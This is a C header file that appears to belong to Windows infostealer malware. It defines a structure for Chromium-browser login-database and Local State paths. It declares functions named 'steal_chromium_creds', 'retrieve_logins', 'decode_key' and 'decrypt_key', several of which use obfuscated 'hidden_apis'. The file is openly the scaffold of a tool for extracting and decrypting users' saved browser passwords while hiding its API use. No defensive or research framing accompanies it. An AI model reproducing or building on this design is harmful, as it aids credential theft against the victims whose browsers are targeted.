#ifndef CHROMIUM_H
#define CHROMIUM_H

#include <windows.h>
#include <winnt.h>
#include "obfuscation.h"
#include "logins.h"

#define MAX_BROWSER_NAME_SIZE 20
#define MAX_LOGIN_DATA_PATH_SIZE 57
#define MAX_LOCAL_STATE_PATH_SIZE 50

typedef struct {
  WCHAR browserName[MAX_BROWSER_NAME_SIZE];
  WCHAR loginDataPath[MAX_LOGIN_DATA_PATH_SIZE];
  WCHAR localStatePath[MAX_LOCAL_STATE_PATH_SIZE];
} BrowserInfo;

int steal_chromium_creds();
static int steal_browser_creds(BrowserInfo browser);
static int retrieve_logins(PWSTR fullPath, int *loginCountOut,
                           Login *loginsOut[]);
static int retrieve_encoded_key(PWSTR localStatePath, PSTR *encryptedKeyOut);
static int decode_key(PSTR encodedKey, BYTE *decodedKeyOut[],
                      size_t *decodedKeySizeOut, hidden_apis *apis);
static int decrypt_key(BYTE *encryptedKey, size_t encryptedKeySize,
                       DATA_BLOB *decryptedKeyOut, hidden_apis *apis);

#endif
